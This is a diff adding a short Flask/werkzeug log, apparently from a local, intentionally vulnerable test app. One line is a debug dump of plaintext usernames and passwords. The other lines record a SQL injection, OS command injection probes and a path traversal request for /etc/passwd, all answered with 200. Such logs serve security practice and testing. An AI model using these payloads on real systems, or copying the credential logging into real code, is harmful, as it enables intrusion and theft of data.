@@ -1,0 +1,5 @@
+DEBUG:root:[('test', 'test'), ('erlik', '$x&3de)GwWEIjyhpsA'), ('erlik', '12345'), ('erlik', 'f2Vbhj38qrS4018JDSKa'), ('test', '12345'), ('test', '$x&3de)GwWEIjyhpsA'), ('erlik', '66f2816ac6A!')]
+INFO:werkzeug:127.0.0.1 - - [05/Dec/2023 00:21:47] "GET /user/'%20OR%201=1%20-- HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [05/Dec/2023 00:22:01] "GET /os_inj?hostname=id HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [05/Dec/2023 00:22:05] "GET /os_inj?hostname=pwd HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [05/Dec/2023 00:22:18] "GET /read_file?filename=/../../../../../../etc/passwd HTTP/1.1" 200 -
